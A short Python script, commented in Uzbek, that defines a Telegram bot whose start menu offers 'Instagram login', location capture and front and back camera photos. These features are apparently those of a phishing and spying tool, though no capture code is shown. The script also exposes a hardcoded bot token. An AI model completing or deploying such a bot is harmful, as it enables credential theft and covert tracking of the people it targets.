import telebot
from telebot import types

# Kodingizdagi token bilan bir xil bo'lishi kerak
bot = telebot.TeleBot("8505367720:AAEkegoUeQWWysWqgbE3U4xuQuH6_URduz4")

@bot.message_handler(commands=['start'])
def start_menu(message):
    markup = types.InlineKeyboardMarkup()
    
    # Tugmalar matni rasmga moslashtirildi
    btn1 = types.InlineKeyboardButton("🔑 Instagram login", callback_data="inst")
    btn2 = types.InlineKeyboardButton("📍 Lokatsiya olish", callback_data="loc")
    btn3 = types.InlineKeyboardButton("📷 Rasm olish old", callback_data="img_f")
    btn4 = types.InlineKeyboardButton("📷 Rasm olish orqa", callback_data="img_b")
    # ... qolgan tugmalarni ham markup.add orqali qo'shishingiz mumkin

    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    
    bot.send_message(message.chat.id, "Bajariladigan amalni tanlang:", reply_markup=markup)

bot.polling()   